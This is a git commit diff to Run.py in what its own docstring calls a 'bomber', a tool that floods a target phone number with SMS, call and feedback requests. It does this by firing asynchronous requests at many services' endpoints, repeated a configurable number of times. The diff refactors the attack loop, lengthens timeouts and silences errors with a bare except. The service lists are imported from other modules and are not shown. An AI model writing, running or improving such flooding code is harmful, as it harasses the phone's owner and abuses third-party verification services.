b74b35f50f19787c578216f7070f055e6a2e036c
whoami <j3yablo4koo@gmail.com>
2024-08-27 19:53:58 +0200

    Update Run.py

--- Run.py
+++ Run.py
@@ -1,36 +1,34 @@
-import asyncio
-import logging
+from asyncio import ensure_future, gather, run
 from aiohttp import ClientSession
+
 from Core.Attack.Services import urls
 from Core.Attack.Feedback_Services import feedback_urls
 from Core.Config import check_config
 
 
+
 async def request(session, url):
     try:
-        config = check_config()
-        type_attack = ('SMS', 'CALL', 'FEEDBACK') if config['type_attack'] == 'MIX' else config['type_attack']
+        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']
 
         if url['info']['attack'] in type_attack:
-            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=10) as response:
+            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                 return await response.text()
-    except Exception as e:
-        logging.error(f"Error requesting {url['url']}: {e}")
+    except:
         pass
 
 
-async def async_attacks(number, session):
-    config = check_config()
-    services = (urls(number) + feedback_urls(number)) if config['feedback'] == 'True' else urls(number)
-    tasks = [asyncio.create_task(request(session, service)) for service in services]
-    await asyncio.gather(*tasks)
+
+async def async_attacks(number):
+    async with ClientSession() as session:
+        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
+        tasks = [ensure_future(request(session, service)) for service in services]
+        await gather(*tasks)
+
 
 
 def start_async_attacks(number, replay):
     '''Запуск бомбера'''
-    async def run_attacks():
-        async with ClientSession() as session:
-            for _ in range(int(replay)):
-                await async_attacks(number, session)
 
-    asyncio.run(run_attacks())
+    for _ in range(int(replay)):
+        run(async_attacks(number))
